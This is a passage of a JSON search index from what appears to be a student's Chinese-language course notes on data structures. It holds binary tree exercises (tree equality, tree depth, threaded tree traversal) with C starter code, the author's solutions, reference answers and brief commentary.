CalLeafNum(t-&gt;rchild);\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_9","title":"\u4e24\u68f5\u4e8c\u53c9\u6811\u662f\u5426\u76f8\u540c","text":"<p>\u8bf7\u7f16\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5b8c\u6210<code>sametree</code>\u51fd\u6570\uff0c\u5b9e\u73b0\u5224\u65ad\u4e24\u68f5\u4e8c\u53c9\u6811\u662f\u5426\u662f\u76f8\u540c\u6811\u7684\u529f\u80fd\u3002\u6bcf\u68f5\u4e8c\u53c9\u6811\u7684\u7ed3\u70b9\u5305\u542b\u5b57\u7b26\u6570\u636e\uff0c\u91c7\u7528\u4e2d\u5e8f\u904d\u5386\u548c\u540e\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u8f93\u5165\u3002\u5982\u679c\u4e24\u4e2a\u4e8c\u53c9\u6811\u76f8\u540c\u65f6\uff0c\u8fd4\u56de1\uff1b\u4e0d\u540c\u65f6\uff0c\u5219\u8fd4\u56de0\u3002</p> <p>\u793a\u4f8b\u8f93\u51fa</p> Text Only<pre><code>1\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_10","title":"\u9898\u76ee","text":"C<pre><code>//\u5224\u65ad\u4e24\u68f5\u4e8c\u53c9\u6811\u662f\u5426\u76f8\u540c\n#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\n//\u4e8c\u53c9\u6811\u7684\u5b58\u50a8\u8868\u793a \ntypedef char TElemType;\ntypedef struct BiTNode{\n    TElemType data;\n    struct BiTNode *lchild, * rchild;   //\u5de6\u53f3\u5b69\u5b50\u6307\u9488 \n}BiTNode, *BiTree;\n\n//\u8bf7\u5b8c\u6210\u8be5\u51fd\u6570\uff0c\u5b9e\u73b0\u5224\u65ad\u4e24\u68f5\u4e8c\u53c9\u6811\u662f\u5426\u662f\u76f8\u540c\u7684\u6811\u7684\u529f\u80fd \n//\u76f8\u540c\uff0c\u8fd4\u56de1\uff1b\u4e0d\u540c\uff0c\u5219\u8fd4\u56de0 \nint sametree(BiTree t1, BiTree t2) {\n    //\u5728\u6b64\u8f93\u5165\u4ee3\u7801\n\n}\n\nBiTree CreateBitree(TElemType inorder[], TElemType postorder[], int lowin, int highin, int lowpost, int highpost)\n{\n    int i = lowin;\n    BiTree bt=(BiTree)malloc(sizeof(BiTNode));//\u7533\u8bf7\u7ed3\u70b9\n    bt-&gt;data=postorder[highpost];//\u540e\u5e8f\u904d\u5386\u7684\u6700\u540e\u4e00\u4e2a\u7ed3\u70b9\u662f\u6839\u7ed3\u70b9\n\n    while(inorder[i]!=postorder[highpost]) //\u5728\u4e2d\u5e8f\u5e8f\u5217\u4e2d\u67e5\u627e\u6839\u7ed3\u70b9\n       i++;\n    if(i==lowin)\n        bt-&gt;lchild=NULL;  //\u5904\u7406\u5de6\u5b50\u6811\n    else\n        bt-&gt;lchild=CreateBitree(inorder,postorder,lowin,i-1,lowpost,lowpost+i-lowin-1);\n    if(i==highin)\n        bt-&gt;rchild=NULL;  //\u5904\u7406\u53f3\u5b50\u6811\n    else\n        bt-&gt;rchild=CreateBitree(inorder,postorder,i+1,highin,lowpost+i-lowin,highpost-1);\n    return bt;\n}\n\nint main()\n{\n    BiTree t1;\n    BiTree t2;\n    TElemType in[]=\"DBEAFCG\";//\u4e2d\u5e8f \n    TElemType post[]=\"DEBFGCA\"; //\u540e\u5e8f \n    t1 = CreateBitree(in, post, 0,strlen(in)-1,0,strlen(post)-1);//\u5efa\u7acb\u7b2c\u4e00\u4e2a\u4e8c\u53c9\u6811\n    TElemType in2[]=\"DBEAFCG\";//\u4e2d\u5e8f \n    TElemType post2[]=\"DEBFGCA\";    //\u540e\u5e8f \n    t2 = CreateBitree(in2, post2, 0,strlen(in2)-1,0,strlen(post2)-1);//\u5efa\u7acb\u7b2c\u4e8c\u4e2a\u4e8c\u53c9\u6811\n    printf(\"%d\",sametree(t1,t2));\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_11","title":"\u7b54\u6848","text":"<p>\u53ea\u770b<code>sametree()</code>\u5c31\u884c\uff0c\u522b\u7684\u90fd\u4e00\u6837\u3002</p> <p>\u8fd8\u662f\u9012\u5f52\uff0c\u5168\u662f\u9012\u5f52\u3002\u6bd5\u7adf\u4e8c\u53c9\u6811\u5c31\u662f\u8fd9\u4e48\u4e2a\u601d\u60f3\u3002</p> C<pre><code>//\u5224\u65ad\u4e24\u68f5\u4e8c\u53c9\u6811\u662f\u5426\u76f8\u540c\nint sametree(BiTree t1, BiTree t2) {\n    if (t1 == NULL &amp;&amp; t2 == NULL) {\n        return 1; //\u4e24\u68f5\u6811\u90fd\u4e3a\u7a7a\uff0c\u8ba4\u4e3a\u5b83\u4eec\u76f8\u540c\n    }\n    else if (t1 == NULL || t2 == NULL) {\n        return 0; // \u4e24\u68f5\u6811\u4e2d\u6709\u4e00\u68f5\u4e3a\u7a7a\uff0c\u8ba4\u4e3a\u5b83\u4eec\u4e0d\u76f8\u540c\n    }\n    else if (t1-&gt;data != t2-&gt;data) {\n        return 0; // \u6839\u8282\u70b9\u7684\u503c\u4e0d\u76f8\u540c\uff0c\u8ba4\u4e3a\u4e24\u68f5\u6811\u4e0d\u76f8\u540c\n    }\n\n    // \u4e00\u5b9a\u8981\u770b\u6e05\u695a\u4e0a\u9762\u7684\u8fd9\u4e09\u4e2a\u6761\u4ef6\u5224\u65ad\u3002\n    // \u4e00\u5b9a\u8981\u5148\u5224\u65ad\u6839\u8282\u70b9\uff0c\u518d\u5224\u65ad\u5de6\u53f3\u5b50\u6811\uff0c\u5426\u5219\u4f1a\u6b7b\u5faa\u73af\n\n    int leftSame = sametree(t1-&gt;lchild, t2-&gt;lchild); // \u5224\u65ad\u5de6\u5b50\u6811\u662f\u5426\u76f8\u540c\n    int rightSame = sametree(t1-&gt;rchild, t2-&gt;rchild); // \u5224\u65ad\u53f3\u5b50\u6811\u662f\u5426\u76f8\u540c\n\n    return leftSame &amp;&amp; rightSame; // \u5f53\u5de6\u5b50\u6811\u548c\u53f3\u5b50\u6811\u90fd\u76f8\u540c\u65f6\uff0c\u8ba4\u4e3a\u4e24\u68f5\u6811\u76f8\u540c\n    // \u56e0\u4e3a\u662f leftSame &amp;&amp; rightSame; \u6240\u4ee5\u8fc7\u7a0b\u4e2d\u53ea\u8981\u6709\u4e00\u4e2a\u662f0\u5c31\u4f1a\u4e00\u76f4\u662f0\n}\n</code></pre> <p>\u5176\u5b9e\u628a\u4e0b\u9762\u8fd9\u6bb5\u4ee3\u7801\u5220\u9664\uff0c\u4e5f\u80fd\u901a\u8fc7\u68c0\u67e5\uff1a</p> <p>C<pre><code>else if (t1-&gt;data != t2-&gt;data) {\n  return 0; // \u6839\u8282\u70b9\u7684\u503c\u4e0d\u76f8\u540c\uff0c\u8ba4\u4e3a\u4e24\u68f5\u6811\u4e0d\u76f8\u540c\n}\n</code></pre> \u6211\u5f88\u4e0d\u7406\u89e3\u3002\u770b\u770b\u8fd9\u4e2a\u9898\u7684\u6807\u9898\u201c\u4e24\u68f5\u4e8c\u53c9\u6811\u662f\u5426\u76f8\u540c\u201d\u4ee5\u53ca\u4e0b\u4e00\u4e2a\u9898\u7684\u6807\u9898\u201c\u5224\u522b\u4e24\u68f5\u4e8c\u53c9\u6811\u662f\u5426\u76f8\u7b49\u201d\uff0c\u96be\u9053\u5b83\u53ea\u8981\u6c42\u7ed3\u6784\u76f8\u540c\uff0c\u6ca1\u6709\u8981\u6c42\u6570\u636e\u4e5f\u76f8\u540c\uff1f\uff1f</p> <p>\u8003\u8bd5\u5343\u4e07\u522b\u5220\u9664\u8fd9\u4e00\u53e5\uff01\uff01\uff01</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_12","title":"\u6807\u51c6\u7b54\u6848\uff08\u90fd\u4e00\u6837\uff09","text":"C<pre><code>int sametree(BiTree t1, BiTree t2) {\n    if (t1 == NULL || t2 == NULL) {\n        if (t1 == NULL &amp;&amp; t2 == NULL) {\n            return 1;\n        }\n        else {\n            return 0;\n        }\n    }\n    if (t1-&gt;data != t2-&gt;data) {\n        return 0;\n    }\n    return sametree(t1-&gt;lchild, t2-&gt;lchild) &amp;&amp; sametree(t1-&gt;rchild, t2-&gt;rchild);\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_13","title":"\u5224\u522b\u4e24\u68f5\u4e8c\u53c9\u6811\u662f\u5426\u76f8\u7b49","text":"<p>\u8bf7\u7f16\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5b9e\u73b0\u5224\u65ad\u4e24\u68f5\u4e8c\u53c9\u6811\u662f\u5426\u76f8\u540c\u7684\u529f\u80fd\u3002\u6bcf\u68f5\u4e8c\u53c9\u6811\u91c7\u7528\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u8f93\u5165\uff0c\u5176\u4e2d\u7528\u2019#'\u8868\u793a\u7a7a\u7ed3\u70b9\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_14","title":"\u793a\u4f8b","text":"<p>\u8f93\u5165</p> Text Only<pre><code>\u8bf7\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u7684\u65b9\u5f0f\u8f93\u5165\u7b2c\u4e00\u68f5\u6811\uff08#\u8868\u793a\u7ed3\u70b9\u6ca1\u6709\u5b50\u6811\uff09\uff1aa##\n\n\u8bf7\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u7684\u65b9\u5f0f\u8f93\u5165\u7b2c\u4e8c\u68f5\u6811\uff08#\u8868\u793a\u7ed3\u70b9\u6ca1\u6709\u5b50\u6811\uff09\uff1aa##\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>YES\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_15","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct BiTNode {\n    char data;\n    struct BiTNode *lchild, *rchild;\n} BiTNode, *Bitree;\n\nvoid Creat_Bitree(Bitree *T) {\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nint Judge_Same_Tree(Bitree T1, Bitree T2) {\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nint main() {\n    Bitree T1, T2;\n    printf(\"\u8bf7\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u8f93\u5165\u7b2c\u4e00\u68f5\u6811\uff08#\u8868\u793a\u7ed3\u70b9\u6ca1\u6709\u5b50\u6811\uff09\uff1a\");\n    Creat_Bitree(&amp;T1);\n    getchar();\n    printf(\"\\n\u8bf7\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u8f93\u5165\u7b2c\u4e8c\u68f5\u6811\uff08#\u8868\u793a\u7ed3\u70b9\u6ca1\u6709\u5b50\u6811\uff09\uff1a\");\n    Creat_Bitree(&amp;T2);\n    getchar();\n    printf(\"\\n\");\n    if (!Judge_Same_Tree(T1, T2))\n        printf(\"NO\");\n    else\n        printf(\"YES\");\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_16","title":"\u7b54\u6848","text":"<p><code>Judge_Same_Tree()</code>\u51fd\u6570\u548c\u4e0a\u9762\u7684\u4e00\u6837\uff0c\u4e0d\u8fc7\u4e5f\u6709\u533a\u522b\uff0c\u5c31\u662f\u8fd9\u6b21\u786e\u5b9e\u4f1a\u68c0\u67e5\u6570\u503c\u662f\u5426\u76f8\u540c\uff0c\u6240\u4ee5\u50cf\u4e0a\u4e00\u9053\u9898\u90a3\u6837\u628a<code>else if (t1-&gt;data != t2-&gt;data) {return 0;}</code>\u8fd9\u90e8\u5206\u5220\u9664\u540e\u5e76\u4e0d\u884c\u3002</p> <p>\u6240\u4ee5\u4e3b\u8981\u5c31\u662f<code>Creat_Bitree()</code>\u51fd\u6570\u3002</p> <p>\u4e8c\u91cd\u6307\u9488\uff0c\u6ce8\u610f\u9012\u5f52\u65f6<code>Creat_Bitree(&amp;((*T)-&gt;lchild));</code>\u3001<code>Creat_Bitree(&amp;((*T)-&gt;rchild));</code>\u7684\u4f20\u53c2\u3002</p> <p>\u8bf4\u4e00\u4e0b<code>main()</code>\u51fd\u6570\u4e2d\u7684\u4e24\u4e2a<code>getchar();</code>\uff1a</p> <p>\u5728\u4e3b\u51fd\u6570\u4e2d\u7684\u4e24\u4e2a<code>getchar()</code>\u51fd\u6570\u8c03\u7528\u7684\u4f5c\u7528\u662f\u7528\u4e8e\u6d88\u8017\u8f93\u5165\u7f13\u51b2\u533a\u4e2d\u7684\u6362\u884c\u7b26\u3002\u8fd9\u662f\u56e0\u4e3a\u5728\u7528\u6237\u8f93\u5165\u5b8c\u7b2c\u4e00\u68f5\u6811\u7684\u5148\u5e8f\u904d\u5386\u5e8f\u5217\u540e\u6309\u4e0b\u56de\u8f66\u952e\uff0c\u8f93\u5165\u7f13\u51b2\u533a\u4e2d\u4f1a\u5305\u542b\u4e00\u4e2a\u6362\u884c\u7b26\u3002\u5982\u679c\u4e0d\u6d88\u8017\u8fd9\u4e2a\u6362\u884c\u7b26\uff0c\u4e0b\u4e00\u4e2a\u8f93\u5165\u64cd\u4f5c\u5c31\u4f1a\u76f4\u63a5\u8bfb\u53d6\u5230\u6362\u884c\u7b26\uff0c\u5bfc\u81f4\u7b2c\u4e8c\u68f5\u6811\u7684\u8f93\u5165\u88ab\u8df3\u8fc7\u3002\u901a\u8fc7\u8c03\u7528\u4e24\u6b21<code>getchar()</code>\u51fd\u6570\uff0c\u53ef\u4ee5\u6d88\u8017\u6389\u8f93\u5165\u7f13\u51b2\u533a\u4e2d\u7684\u6362\u884c\u7b26\uff0c\u786e\u4fdd\u63a5\u4e0b\u6765\u7684\u8f93\u5165\u64cd\u4f5c\u6b63\u5e38\u8fdb\u884c\u3002</p> <p>\u5176\u5b9e\u4e5f\u5c31\u662f\u7b2c\u4e00\u4e2a<code>getchar();</code>\u6709\u7528\uff0c\u7b2c\u4e8c\u4e2a\u53ef\u6709\u53ef\u65e0\u3002</p> C<pre><code>void Creat_Bitree(Bitree* T) {\n    char ch;\n    scanf(\"%c\", &amp;ch);\n\n    if (ch == '#') {\n        *T = NULL;\n    }\n\n    else {\n        *T = (Bitree)malloc(sizeof(BiTNode));\n        (*T)-&gt;data = ch;\n        Creat_Bitree(&amp;((*T)-&gt;lchild));\n        Creat_Bitree(&amp;((*T)-&gt;rchild));\n    }\n}\n\n\nint Judge_Same_Tree(Bitree T1, Bitree T2) {\n    if (T1 == NULL &amp;&amp; T2 == NULL) {\n        return 1; // \u4e24\u68f5\u6811\u90fd\u4e3a\u7a7a\uff0c\u8ba4\u4e3a\u5b83\u4eec\u76f8\u7b49\n    }\n    else if (T1 == NULL || T2 == NULL) {\n        return 0; // \u4e24\u68f5\u6811\u4e2d\u6709\u4e00\u68f5\u4e3a\u7a7a\uff0c\u8ba4\u4e3a\u5b83\u4eec\u4e0d\u76f8\u7b49\n    }\n    else if (T1-&gt;data != T2-&gt;data) {\n        return 0; // \u6839\u8282\u70b9\u7684\u503c\u4e0d\u76f8\u7b49\uff0c\u8ba4\u4e3a\u4e24\u68f5\u6811\u4e0d\u76f8\u7b49\n    }\n\n    int leftSame = Judge_Same_Tree(T1-&gt;lchild, T2-&gt;lchild); // \u5224\u65ad\u5de6\u5b50\u6811\u662f\u5426\u76f8\u7b49\n    int rightSame = Judge_Same_Tree(T1-&gt;rchild, T2-&gt;rchild); // \u5224\u65ad\u53f3\u5b50\u6811\u662f\u5426\u76f8\u7b49\n\n    return leftSame &amp;&amp; rightSame; // \u5f53\u5de6\u5b50\u6811\u548c\u53f3\u5b50\u6811\u90fd\u76f8\u7b49\u65f6\uff0c\u8ba4\u4e3a\u4e24\u68f5\u6811\u76f8\u7b49\n    // \u56e0\u4e3a\u662f leftSame &amp;&amp; rightSame; \u6240\u4ee5\u8fc7\u7a0b\u4e2d\u53ea\u8981\u6709\u4e00\u4e2a\u662f0\u5c31\u4f1a\u4e00\u76f4\u662f0\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_17","title":"\u6807\u51c6\u7b54\u6848\uff08\u90fd\u4e00\u6837\uff09","text":"C<pre><code>void Creat_Bitree(Bitree* T) {\n    char ch;\n    ch = getchar();\n    if (ch == '#')\n        *T = NULL; // \u7a7a\u6811\n    else {\n        *T = (Bitree)malloc(sizeof(BiTNode)); // \u521b\u5efa\u7ed3\u70b9\n        (*T)-&gt;data = ch;\n        Creat_Bitree(&amp;(*T)-&gt;lchild); // \u5de6\u5b50\u6811\n        Creat_Bitree(&amp;(*T)-&gt;rchild); // \u53f3\u5b50\u6811\n    }\n}\n\nint Judge_Same_Tree(Bitree T1, Bitree T2) {\n    if (T1 == NULL || T2 == NULL) {\n        if (T1 == NULL &amp;&amp; T2 == NULL) {\n            return 1;\n        }\n        else {\n            return 0;\n        }\n    }\n    if (T1-&gt;data != T2-&gt;data) {\n        return 0;\n    }\n    return Judge_Same_Tree(T1-&gt;lchild, T2-&gt;lchild) &amp;&amp; Judge_Same_Tree(T1-&gt;rchild, T2-&gt;rchild);\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_18","title":"\u6c42\u4e8c\u53c9\u6811\u7684\u6df1\u5ea6","text":"<p>\u8bf7\u5b8c\u6210<code>GetDepth</code>\u51fd\u6570\uff0c\u5b9e\u73b0\u8ba1\u7b97\u4e8c\u53c9\u6811\u6df1\u5ea6\u7684\u529f\u80fd\uff0c\u51fd\u6570\u8fd4\u56de\u4e8c\u53c9\u6811\u7684\u6df1\u5ea6\u3002</p> <p>\u793a\u4f8b\u8f93\u51fa</p> Text Only<pre><code>3\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_19","title":"\u9898\u76ee","text":"C<pre><code>//\u6c42\u4e8c\u53c9\u6811\u7684\u6df1\u5ea6\n#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n#include&lt;string.h&gt;\n\n//\u4e8c\u53c9\u6811\u7684\u5b58\u50a8\u8868\u793a \ntypedef char TElemType;\ntypedef struct BiTNode{\n    TElemType data;\n    struct BiTNode *lchild, * rchild;   //\u5de6\u53f3\u5b69\u5b50\u6307\u9488 \n}BiTNode, *BiTree;\n\n//\u8ba1\u7b97\u4e8c\u53c9\u6811\u7684\u6df1\u5ea6\n//\u8fd4\u56de\u503c\uff1a\u4e8c\u53c9\u6811\u7684\u6df1\u5ea6 \nint GetDepth(BiTree t) {\n    //\u8bf7\u5728\u6b64\u5904\u5b8c\u6210\u4ee3\u7801 \n\n}\n\nBiTree CreateBitree(TElemType inorder[], TElemType postorder[], int lowin, int highin, int lowpost, int highpost)\n{\n    BiTree bt=(BiTree)malloc(sizeof(BiTNode));//\u7533\u8bf7\u7ed3\u70b9\n    bt-&gt;data=postorder[highpost];//\u540e\u5e8f\u904d\u5386\u7684\u6700\u540e\u4e00\u4e2a\u7ed3\u70b9\u662f\u6839\u7ed3\u70b9\n    int i = lowin;\n    while(inorder[i]!=postorder[highpost]) //\u5728\u4e2d\u5e8f\u5e8f\u5217\u4e2d\u67e5\u627e\u6839\u7ed3\u70b9\n    {\n       i++;\n    }\n    if(i==lowin)\n        bt-&gt;lchild=NULL;  //\u5904\u7406\u5de6\u5b50\u6811\n    else\n        bt-&gt;lchild=CreateBitree(inorder,postorder,lowin,i-1,lowpost,lowpost+i-lowin-1);\n    if(i==highin)\n        bt-&gt;rchild=NULL;  //\u5904\u7406\u53f3\u5b50\u6811\n    else\n        bt-&gt;rchild=CreateBitree(inorder,postorder,i+1,highin,lowpost+i-lowin,highpost-1);\n    return bt;\n}\n\nint main()\n{\n    TElemType in[]=\"DBEAFCG\";//\u4e2d\u5e8f \n    TElemType post[]=\"DEBFGCA\"; //\u540e\u5e8f \n    BiTree t;\n    t = CreateBitree(in, post, 0,strlen(in)-1,0,strlen(post)-1);\n    printf(\"%d\",GetDepth(t));\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_20","title":"\u7b54\u6848","text":"C<pre><code>int GetDepth(BiTree t) {\n    if (t == NULL) {\n        return 0;\n    }\n    else {\n        int leftDepth = GetDepth(t-&gt;lchild);\n        int rightDepth = GetDepth(t-&gt;rchild);\n        return (leftDepth &gt; rightDepth) ? (leftDepth + 1) : (rightDepth + 1);\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_21","title":"\u6807\u51c6\u7b54\u6848\uff08\u90fd\u4e00\u6837\uff09","text":"C<pre><code>int GetDepth(BiTree t) {\n    if (t == NULL) {\n        return 0;\n    }\n    int l = GetDepth(t-&gt;lchild);\n    int r = GetDepth(t-&gt;rchild);\n    if (l &gt; r)\n        return l + 1;\n    else\n        return r + 1;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_22","title":"\u7ebf\u7d22\u4e8c\u53c9\u6811\uff08\u4e2d\u5e8f\u904d\u5386\uff09","text":"<p>\u8bf7\u7f16\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5b9e\u73b0\u5bf9\u4e2d\u5e8f\u7ebf\u7d22\u4e8c\u53c9\u6811\u7684\u4e2d\u5e8f\u626b\u63cf\u3002\u6bcf\u4e2a\u7ed3\u70b9\u5305\u542b\u5b57\u7b26\u6570\u636e\u548c\u6307\u5411\u5de6\u53f3\u5b50\u6811\u7684\u6307\u9488\uff0c\u4ee5\u53ca\u5de6\u53f3\u7ebf\u7d22\u6807\u8bb0\u3002\u5de6\u7ebf\u7d22\u6807\u8bb0 LTag \u4e3a 0 \u8868\u793a\u6307\u5411\u5de6\u5b50\u6811\uff0c\u4e3a 1 \u8868\u793a\u6307\u5411\u4e2d\u5e8f\u904d\u5386\u7684\u524d\u9a71\u7ed3\u70b9\u3002\u53f3\u7ebf\u7d22\u6807\u8bb0 RTag \u4e3a 0 \u8868\u793a\u6307\u5411\u53f3\u5b50\u6811\uff0c\u4e3a 1 \u8868\u793a\u6307\u5411\u4e2d\u5e8f\u904d\u5386\u7684\u540e\u7ee7\u7ed3\u70b9\u3002</p> <p>\u793a\u4f8b\u8f93\u51fa</p> Text Only<pre><code>H D I B J E A F C G \n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_23","title":"\u9898\u76ee","text":"C<pre><code>//\u5df2\u77e5\u4e00\u4e2d\u5e8f\u7ebf\u7d22\u4e8c\u53c9\u6811,\u5199\u4e00\u7b97\u6cd5\u5b8c\u6210\u5bf9\u5b83\u7684\u4e2d\u5e8f\u626b\u63cf\n#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n#include&lt;string.h&gt;\n\n//\u4e8c\u53c9\u6811\u7684\u4e8c\u53c9\u7ebf\u7d22\u5b58\u50a8\u8868\u793a \ntypedef enum {Link, Thread} PointerTag; //Link==0:\u6307\u9488\uff0cThread==1\uff1a\u7ebf\u7d22 \ntypedef char TElemType;\ntypedef struct BiThrNode{\n    TElemType data;\n    struct BiThrNode *lchild, * rchild; //\u5de6\u53f3\u5b69\u5b50\u6307\u9488 \n    PointerTag LTag,RTag; \n}BiThrNode, *BiThrTree;\n\nvoid visit(BiThrTree t)\n{\n    printf(\"%c \",t-&gt;data);\n}\n//t\u662f\u6307\u5411\u4e2d\u5e8f\u5168\u7ebf\u7d22\u5316\u5934\u7ed3\u70b9\u7684\u6307\u9488\uff0c\u8be5\u7b97\u6cd5\u5b9e\u73b0\u5bf9\u7ebf\u7d22\u4e8c\u53c9\u6811\u4e2d\u5e8f\u904d\u5386\nvoid InOrderThreat(BiThrTree t){\n    BiThrTree p=t-&gt;lchild;  //p\u6307\u5411\u4e8c\u53c9\u6811\u7684\u6839\u7ed3\u70b9\uff0c\u5f53\u4e8c\u53c9\u6811\u4e3a\u7a7a\u65f6\uff0cp\u6307\u5411t\n    //\u8bf7\u5728\u6b64\u5b8c\u6210\u4ee3\u7801\n\n}\n\n//\u521b\u5efa\u6811\nBiThrTree CreateTree(){\n    //\u5b9a\u4e49\u7ed3\u6784\u4f53\u5bf9\u8c61\n    BiThrTree head = NULL,t1 = NULL, t2 = NULL, t3 = NULL, t4 = NULL, t5 = NULL, t6 = NULL, t7 = NULL, t8 = NULL, t9 = NULL, t10 = NULL;\n    head = (BiThrTree)malloc(sizeof(BiThrNode));\n    memset(head, 0, sizeof(BiThrNode));\n    t1 = (BiThrTree)malloc(sizeof(BiThrNode));\n    memset(t1, 0, sizeof(BiThrNode));\n    t2 = (BiThrTree)malloc(sizeof(BiThrNode));\n    memset(t2, 0, sizeof(BiThrNode));\n    t3 = (BiThrTree)malloc(sizeof(BiThrNode));\n    memset(t3, 0, sizeof(BiThrNode));\n    t4 = (BiThrTree)malloc(sizeof(BiThrNode));\n    memset(t4, 0, sizeof(BiThrNode));\n    t5 = (BiThrTree)malloc(sizeof(BiThrNode));\n    memset(t5, 0, sizeof(BiThrNode));\n    t6 = (BiThrTree)malloc(sizeof(BiThrNode));\n    memset(t6, 0, sizeof(BiThrNode));\n    t7 = (BiThrTree)malloc(sizeof(BiThrNode));\n    memset(t7, 0, sizeof(BiThrNode));\n    t8 = (BiThrTree)malloc(sizeof(BiThrNode));\n    memset(t8, 0, sizeof(BiThrNode));\n    t9 = (BiThrTree)malloc(sizeof(BiThrNode));\n    memset(t9, 0, sizeof(BiThrNode));\n    t10 = (BiThrTree)malloc(sizeof(BiThrNode));\n    memset(t10, 0, sizeof(BiThrNode));\n    t1-&gt;data = 'A';\n    t2-&gt;data = 'B';\n    t3-&gt;data = 'C';\n    t4-&gt;data = 'D';\n    t5-&gt;data = 'E';\n    t6-&gt;data = 'F';\n    t7-&gt;data = 'G';\n    t8-&gt;data = 'H';\n    t9-&gt;data = 'I';\n    t10-&gt;data = 'J';\n\n    head-&gt;lchild = t1;\n    head-&gt;rchild = t7;\n    head-&gt;LTag = Link;\n    head-&gt;RTag = Thread;\n\n    t1-&gt;lchild = t2;\n    t1-&gt;rchild = t3;\n    t1-&gt;LTag = 0;\n    t1-&gt;RTag = 0;\n\n    t2-&gt;lchild = t4;\n    t2-&gt;rchild = t5;\n    t2-&gt;LTag = 0;\n    t2-&gt;RTag = 0;\n\n    t3-&gt;lchild = t6;\n    t3-&gt;rchild = t7;\n    t3-&gt;LTag = 0;\n    t3-&gt;RTag = 0;\n\n    t4-&gt;lchild = t8;\n    t4-&gt;rchild = t9;\n    t4-&gt;LTag = 0;\n    t4-&gt;RTag = 0;\n\n    t5-&gt;lchild = t10;\n    t5-&gt;rchild = t1;\n    t5-&gt;LTag = 0;\n    t5-&gt;RTag = 1;\n\n    t6-&gt;lchild = t1;\n    t6-&gt;rchild = t3;\n    t6-&gt;LTag = 1;\n    t6-&gt;RTag = 1;\n\n    t7-&gt;lchild = t3;\n    t7-&gt;rchild = head;\n    t7-&gt;LTag = 1;\n    t7-&gt;RTag = 1;\n\n    t8-&gt;lchild = head;\n    t8-&gt;rchild = t4;\n    t8-&gt;LTag = 1;\n    t8-&gt;RTag = 1;\n\n    t9-&gt;lchild = t4;\n    t9-&gt;rchild = t2;\n    t9-&gt;LTag = 1;\n    t9-&gt;RTag = 1;\n\n    t10-&gt;lchild = t2;\n    t10-&gt;rchild = t5;\n    t10-&gt;LTag = 1;\n    t10-&gt;RTag = 1;\n    return head;\n}\n\nint main()\n{\n    BiThrTree t;\n    t = CreateTree();\n    InOrderThreat(t);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_24","title":"\u7b54\u6848","text":"<p>\u9898\u76ee\u7528\u5230\u4e86<code>memset()</code>\u51fd\u6570\uff0c\u4e0d\u7528\u591a\u7ba1\u3002</p> <p>\u8fd8\u6709\u5c31\u662f\u679a\u4e3e\uff1a<code>enum</code>\u2026\u2026\u53d1\u73b0\u81ea\u5df1\u90fd\u5feb\u5fd8\u8bb0\u8fd9\u4e48\u4e2a\u4e1c\u897f\u4e86\u3002</p> <p>\u5176\u5b9e\u8fd9\u4e2a\u4e1c\u897f\u662f PPT \u4e0a\u7684\uff0c\u4f46\u662f\u8001\u5e08\u5f53\u65f6\u5019\u8bf4\u4e0d\u8bb2\u8fd9\u4e2a\uff0c\u8003\u8bd5\u4e5f\u4e0d\u4f1a\u8003\uff0c\u5443\u2026\u2026</p> <p></p> 